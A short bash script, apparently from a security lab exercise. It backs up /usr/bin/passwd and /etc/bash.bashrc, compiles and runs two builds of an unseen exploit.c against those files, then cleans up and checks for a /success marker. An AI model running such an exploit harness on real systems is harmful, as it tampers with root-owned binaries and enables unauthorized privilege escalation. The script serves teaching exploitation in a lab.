#!/bin/bash
# author: PB15111599

# backup
echo 'backing up /etc/bash/bashrc /usr/bin/passwd'
cp '/usr/bin/passwd' 'passwd_backup'
cp '/etc/bash.bashrc' 'bashrc_backup'

# compile
echo 'compiling exploit_bashrc'
gcc exploit.c -o exploit_bashrc -lpthread
echo 'compiling exploit_passwd'
gcc exploit.c -o exploit_passwd -lpthread -DSUID

# execute
echo 'executing exploit_bashrc'
./exploit_bashrc
echo 'executing exploit_passwd'
./exploit_passwd

# success
echo 'cleaning'
rm exploit_bashrc exploit_passwd
echo 'done'
ls -l /success
